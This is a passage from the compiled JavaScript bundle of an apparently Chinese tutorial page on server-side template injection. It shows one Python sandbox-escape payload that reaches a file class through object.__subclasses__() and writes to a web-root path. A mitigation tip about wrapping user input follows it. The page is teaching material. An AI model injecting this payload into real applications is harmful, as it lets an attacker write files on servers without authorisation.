<span class="token builtin">object</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#39;/var/www/html/input&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&#39;123&#39;</span><span class="token punctuation">)</span> <span class="token comment">#写文件</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,29);function f(y,x){return p(),e("div",null,[_,n("ul",null,[n("li",null,"将传入可控参数的地方加上变量包裹符"+o()+"，即可防止表达式执行。",1),v,b,m,g]),h])}const j=t(d,[["render",f],["__file","SSTI模板注入.html.vue"]]);export{j as default};
